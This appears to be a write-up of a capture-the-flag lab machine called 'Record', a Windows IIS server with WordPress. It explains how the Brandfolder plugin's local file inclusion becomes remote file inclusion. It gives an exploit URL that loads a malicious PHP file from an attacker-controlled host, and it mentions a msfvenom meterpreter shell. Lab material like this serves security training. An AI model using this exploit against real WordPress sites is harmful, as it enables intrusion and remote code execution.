# Record

Record is a Windows Server 2019 with IIS installed hosting a vulnerable Wordpress installation.

## Initial exploitation

The Wordpress instance has a vulnerable plugin, Brandfolder, installed in it. This plugin is vulnerable to local file inclusion. However, php.ini is configured to allow files to be included via HTTP or FTP. This means that this vulnerability can be used for remote file inclusion.

This can be exploited using this URL: `http://[ip]/wordpress/wp-content/plugins/brandfolder/callback.php?wp_abspath=http://[attacker_ip]/evil/`. The attacker IP must have a malicious PHP script called "wp-load.php" in their web root folder.

## Flag overwrite

IIS has been modified to run its application pools as SYSTEM. This is unrealistic but results in an interesting view if run with msfvenom's PHP meterpreter utility, as the user will be able to execute commands and ls directories, but not actually able to see what's in these directories. This is why the hello world blog post contains a hint for attackers to look for C:\Share (the slash ended up getting pulled out by the SQL dump, but the idea is conveyed fine). Since the attacker is running as SYSTEM, they are able to write to C:\Share\ownership.txt, allowing them to plant their flag.